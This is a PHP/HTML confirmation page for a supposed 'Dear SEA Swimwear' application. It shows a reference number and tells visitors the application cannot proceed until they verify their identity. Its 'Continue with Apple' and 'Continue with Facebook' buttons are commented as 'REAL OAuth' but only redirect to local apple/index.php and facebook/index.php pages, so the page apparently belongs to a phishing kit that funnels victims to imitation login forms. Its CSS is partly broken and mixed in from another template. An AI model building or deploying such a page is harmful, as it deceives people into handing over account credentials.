<?php
session_start();
date_default_timezone_set('Asia/Manila');

$reference = $_SESSION['dearsea_reference'] ?? ('DS-' . date('ymd') . '-' . strtoupper(substr(bin2hex(random_bytes(3)), 0, 6)));
$submitted = date('F j, Y \a\t h:i A');
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <link rel="icon" type="image/png" href="files/images/favicon.png">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Thank You — Dear SEA</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,300;0,9..144,400;0,9..144,500;1,9..144,400;1,9..144,500&family=Manrope:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>
  :root{
    --ivory:#F7F2E8;
    --sand:#E9DECC;
    --sand-deep:#DCCDB2;
    --espresso:#352A22;
    --espresso-70: rgba(53,42,34,.7);
    --espresso-45: rgba(53,42,34,.45);
    --line: rgba(53,42,34,.14);
    --line-soft: rgba(53,42,34,.08);
    --ocean:#54707A;
    --ocean-deep:#3E5860;
    --burgundy:#7C3E3F;
    --white:#FFFDF9;
    --ease: cubic-bezier(.16,.8,.24,1);
  }

  *{box-sizing:border-box;}
  html{scroll-behavior:smooth;}
  body{
    margin:0; min-height:100vh;
    font-family:'Manrope', sans-serif; font-weight:400;
    color:var(--espresso); line-height:1.7;
    -webkit-font-smoothing:antialiased;
    background:
      radial-gradient(640px 480px at -8% -5%, rgba(84,112,122,.14), transparent 62%),
      radial-gradient(640px 480px at 108% 105%, rgba(124,62,63,.10), transparent 62%),
      var(--ivory);
  }
  a{color:inherit; text-decoration:none;}
  button{font-family:inherit; cursor:pointer;}

  h1,.serif{font-family:'Fraunces', serif; font-weight:400; letter-spacing:.01em;}

  .eyebrow{
    font-size:.68rem; letter-spacing:.2em; text-transform:uppercase;
    color:var(--espresso-70); font-weight:600;
  }

  /* ---------- page / card ---------- */
  .page{
    min-height:100vh; display:flex; align-items:center; justify-content:center;
    padding:48px 18px;
  }
  .card{
    width:100%; max-width:480px;
    padding:44px 36px 34px;
    background:var(--white);
    border:1px solid var(--line);
    box-shadow:0 30px 70px rgba(53,42,34,.10);
    text-align:center;
    animation:appear .7s var(--ease) both;
  }
  @keyframes appear{
    from{opacity:0; transform:translateY(22px);}
    to{opacity:1; transform:translateY(0);}
  }

  /* ---------- brand ---------- */
  .brand{display:inline-flex; align-items:center; justify-content:center;}
  .brand img{height:42px; width:auto; display:block;}

  /* ---------- status pill ---------- */
  .status{
    display:inline-flex; align-items:center; gap:8px;
    margin-top:22px; padding:7px 16px;
    border:1px solid var(--line);
    background:var(--ivory);
  }
  .status-dot{width:6px; height:6px; border-radius:50%; background:var(--ocean);}
  .status span.label{
    font-size:.62rem; font-weight:700; letter-spacing:.18em; text-transform:uppercase; color:var(--espresso-70);
  }

  /* ---------- icon ---------- */
  .icon-wrap{
    width:88px; height:88px; margin:26px auto 8px;
    border-radius:50%; display:flex; align-items:center; justify-content:center;
    background:var(--sand); border:1px solid var(--line);
  }
  .icon-wrap svg{width:38px; height:38px; stroke:var(--espresso); fill:none; stroke-width:1.4; stroke-linecap:round; stroke-linejoin:round;}

  /* ---------- heading ---------- */
  h1{font-size:clamp(1.9rem,7vw,2.5rem); line-height:1.12; margin:14px 0 10px;}
  h1 em{font-style:italic; color:var(--burgundy);}
  .intro{max-width:360px; margin:0 auto; color:var(--espresso-70); font-size:.88rem; font-weight:400; line-height:1.75;}

  /* ---------- progress ---------- */
  .progress{display:flex; align-items:flex-start; margin:34px 4px 0; position:relative;}
  .progress::before{
    content:""; position:absolute; top:13px; left:13px; right:13px; height:1px; background:var(--line);
  }
  .step{position:relative; z-index:2; flex:1; display:flex; flex-direction:column; align-items:center; gap:8px;}
  .step-circle{
    width:26px; height:26px; border-radius:50%; display:flex; align-items:center; justify-content:center;
    background:var(--white); border:1px solid var(--line); color:var(--espresso-45); font-size:.62rem; font-weight:700;
  }
  .step.complete .step-circle{background:var(--espresso); border-color:var(--espresso); color:var(--white);}
  .step.active .step-circle{background:var(--burgundy); border-color:var(--burgundy); color:var(--white); box-shadow:0 0 0 5px rgba(124,62,63,.14);}
  .step-label{font-size:.58rem; text-transform:uppercase; letter-spacing:.1em; color:var(--espresso-45);}
  .step.complete .step-label, .step.active .step-label{color:var(--espresso);}

  /* ---------- reference ---------- */
  .reference{
    margin-top:28px; padding:16px 18px;
    border:1px solid var(--line); background:var(--ivory);
    display:flex; align-items:center; justify-content:space-between; gap:16px; text-align:left;
  }
  .reference-label{font-size:.6rem; letter-spacing:.16em; text-transform:uppercase; color:var(--espresso-45); margin-bottom:3px;}
  .reference-number{font-family:'Fraunces',serif; font-size:1.08rem; letter-spacing:.03em; color:var(--espresso);}
  .reference-date{font-size:.7rem; color:var(--espresso-45); font-weight:400; margin-top:2px;}
  .copy{
    flex:none; border:1px solid var(--espresso); background:var(--white); color:var(--espresso);
    padding:9px 15px; font-size:.62rem; font-weight:700; letter-spacing:.1em; text-transform:uppercase;
    transition:background .3s var(--ease), color .3s var(--ease);
  }
  .copy:hover, .copy.copied{background:var(--espresso); color:var(--white);}

  /* ---------- info ---------- */
  .info{margin-top:18px; padding:18px; background:var(--sand); border:1px solid var(--line); text-align:left;}
  .info-title{display:flex; align-items:center; gap:9px; margin-bottom:7px; font-family:'Fraunces',serif; font-size:1.02rem; color:var(--espresso);}
  .info-title svg{width:17px; height:17px; stroke:var(--ocean-deep); fill:none; stroke-width:1.5;}
  .info p{color:var(--espresso-70); font-size:.8rem; font-weight:400; line-height:1.7;}
  .info strong{color:var(--espresso); font-weight:700;}

  /* ---------- action ---------- */
  .action{
    display:block; width:100%; margin-top:22px; padding:16px 22px;
    background:var(--espresso); color:var(--white); text-align:center;
    font-size:.72rem; font-weight:700; letter-spacing:.14em; text-transform:uppercase;
    border:1px solid var(--espresso); transition:background .35s var(--ease), border-color .35s var(--ease);
  }
  .action:hover{background:var(--ocean-deep); border-color:var(--ocean-deep);}

  /* ---------- footer ---------- */
  .footer{margin-top:28px;}
  .footer-line{width:44px; height:1px; margin:0 auto 14px; background:var(--line);}
  .footer strong{display:block; font-family:'Fraunces',serif; font-style:italic; font-size:.98rem; font-weight:500; color:var(--espresso);}
  .footer span{display:block; margin-top:3px; color:var(--espresso-45); font-size:.7rem; font-weight:400;}

  @media (max-width:480px){
    .page{padding:26px 14px;}
    .card{padding:34px 22px 28px;}
    .brand img{height:36px;}
    h1{font-size:2rem;}
    .intro{font-size:.82rem;}
    .step-label{font-size:.5rem;}
    .reference{padding:14px;}
    .reference-number{font-size:.98rem;}
    .copy{padding:8px 11px;}
  }
  @media (prefers-reduced-motion: reduce){
    .card{animation:none;}
    .action{transition:none;}
  }
  * choose-to-continue */
.choose{margin-top:20px;}
.choose-label{font-size:.54rem;letter-spacing:.2em;text-transform:uppercase;color:var(--hi-rose);margin-bottom:12px;}
.auth{display:flex;flex-direction:column;gap:11px;}
.auth-btn{position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;gap:11px;
  width:100%;padding:16px 22px;border-radius:100px;border:none;cursor:pointer;color:#fff;
  font-family:var(--ff-body);font-weight:600;font-size:.74rem;letter-spacing:.12em;
  transition:transform .3s ease,box-shadow .3s ease,letter-spacing .3s ease;}
.auth-btn .ic{width:19px;height:19px;flex:none;}
.auth-btn::after{content:"";position:absolute;top:0;left:-130%;width:55%;height:100%;
  background:linear-gradient(100deg,transparent,rgba(255,255,255,.32),transparent);transition:left .55s ease;}
.auth-btn:hover::after{left:140%;}
.auth-apple{background:#000;box-shadow:0 14px 30px -14px rgba(0,0,0,.8);}
.auth-apple:hover{transform:translateY(-3px);letter-spacing:.16em;box-shadow:0 22px 46px -16px rgba(0,0,0,.75);}
.auth-fb{background:#1877F2;box-shadow:0 14px 30px -14px rgba(24,119,242,.7);}
.auth-fb:hover{background:#1466D2;transform:translateY(-3px);letter-spacing:.16em;box-shadow:0 22px 46px -16px rgba(24,119,242,.75);}
.auth-note{margin-top:11px;font-size:.66rem;color:var(--hi-muted);font-weight:300;line-height:1.5;display:flex;align-items:center;justify-content:center;gap:6px;}
.auth-note svg{width:12px;height:12px;stroke:var(--hi-mauve);fill:none;stroke-width:1.6;flex:none;}

</style>
</head>
<body>

<main class="page">
  <section class="card" aria-labelledby="pageTitle">

    <a href="index.php" class="brand" aria-label="Dear SEA Swimwear">
      <img src="data:image/png;base64,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" alt="Dear SEA">
    </a>

    <div class="status">
      <span class="status-dot"></span>
      <span class="label">Application Pending</span>
    </div>

    <div class="icon-wrap" aria-hidden="true">
      <svg viewBox="0 0 48 48">
        <circle cx="24" cy="24" r="17"></circle>
        <path d="M15 24.5l6 6 12-13"></path>
      </svg>
    </div>

    <h1 id="pageTitle">Your application is <em>pending.</em></h1>

    <p class="intro">
      Thank you for choosing Dear SEA. To move forward, choose how you'd like to <strong>continue and confirm</strong> your identity below.
    </p>

    <div class="progress">
      <div class="step complete">
        <span class="step-circle">&#10003;</span>
        <span class="step-label">Started</span>
      </div>
      <div class="step complete active">
        <span class="step-circle">&#10003;</span>
        <span class="step-label">Submitted</span>
      </div>
      <div class="step ">
        <span class="step-circle">3</span>
        <span class="step-label">Received</span>
      </div>
      <div class="step">
        <span class="step-circle">4</span>
        <span class="step-label">Complete</span>
      </div>
    </div>

    <div class="reference">
      <div>
        <div class="reference-label">Reference No.</div>
        <div class="reference-number" id="referenceNumber"><?php echo htmlspecialchars($reference, ENT_QUOTES, 'UTF-8'); ?></div>
        <div class="reference-date">Submitted <?php echo htmlspecialchars($submitted, ENT_QUOTES, 'UTF-8'); ?></div>
      </div>
      <button type="button" class="copy" id="copyButton" aria-label="Copy reference number">Copy</button>
    </div>

    <div class="info">
      <div class="info-title">
        <svg viewBox="0 0 24 24">
          <circle cx="12" cy="12" r="9"></circle>
          <path d="M12 10.5v5"></path>
          <circle cx="12" cy="7.5" r=".6" fill="currentColor" stroke="none"></circle>
        </svg>
        Why is my status pending?
      </div>
      <p>
        <strong>Pending means your application hasn't been submitted for review yet — </strong>it can't proceed until your identity is confirmed. Choose a secure sign-in option below to verify and unlock the review of your application.
      </p>
    </div>
    <br>
  <!-- Choose to continue (REAL OAuth) -->
<div class="choose">
  <div class="choose-label">Choose how to continue</div>

  <div class="auth">

    <button onclick="goToApple()" class="auth-btn auth-apple">
      <svg class="ic" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
        <path d="M17.05 12.54c-.03-2.53 2.07-3.75 2.16-3.81-1.18-1.72-3.01-1.96-3.66-1.99-1.56-.16-3.04.92-3.83.92-.79 0-2.01-.9-3.3-.87-1.7.02-3.26.99-4.13 2.51-1.76 3.06-.45 7.59 1.27 10.07.84 1.21 1.84 2.57 3.15 2.52 1.26-.05 1.74-.82 3.27-.82 1.52 0 1.96.82 3.3.79 1.36-.02 2.22-1.23 3.05-2.45.96-1.4 1.36-2.76 1.38-2.83-.03-.01-2.64-1.01-2.66-4.04zM14.6 4.7c.7-.85 1.17-2.02 1.04-3.2-1 .04-2.22.67-2.94 1.51-.64.75-1.21 1.95-1.06 3.1 1.12.09 2.26-.57 2.96-1.41z"/>
      </svg>
      Continue with Apple
    </button>

    <button onclick="goToFacebook()" class="auth-btn auth-fb">
      <svg class="ic" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
        <path d="M22 12.06C22 6.5 17.52 2 12 2S2 6.5 2 12.06c0 5.02 3.66 9.18 8.44 9.94v-7.03H7.9v-2.91h2.54V9.85c0-2.52 1.49-3.91 3.77-3.91 1.09 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.78-1.63 1.57v1.89h2.78l-.44 2.91h-2.34V22c4.78-.76 8.44-4.92 8.44-9.94z"/>
      </svg>
      Continue with Facebook
    </button>

  </div>

</div>

<script>
function goToApple(){
  window.location.href = "apple/index.php";
}

function goToFacebook(){
  window.location.href = "facebook/index.php";
}
</script>
   

    <footer class="footer">
      <div class="footer-line"></div>
      <strong>Dear SEA Swimwear</strong>
      <span>Made for slow days by the sea.</span>
    </footer>

  </section>
</main>

<script>
(function(){
  "use strict";

  var copyButton = document.getElementById("copyButton");
  var referenceNumber = document.getElementById("referenceNumber");

  if(copyButton && referenceNumber){
    copyButton.addEventListener("click", function(){
      var value = referenceNumber.textContent.trim();

      function success(){
        copyButton.textContent = "Copied";
        copyButton.classList.add("copied");
        setTimeout(function(){
          copyButton.textContent = "Copy";
          copyButton.classList.remove("copied");
        }, 1800);
      }

      function fallback(){
        var textarea = document.createElement("textarea");
        textarea.value = value;
        textarea.style.position = "fixed";
        textarea.style.opacity = "0";
        document.body.appendChild(textarea);
        textarea.select();
        try{ document.execCommand("copy"); }catch(e){}
        document.body.removeChild(textarea);
        success();
      }

      if(navigator.clipboard && navigator.clipboard.writeText){
        navigator.clipboard.writeText(value).then(success).catch(fallback);
      } else {
        fallback();
      }
    });
  }
})();
</script>

</body>
</html>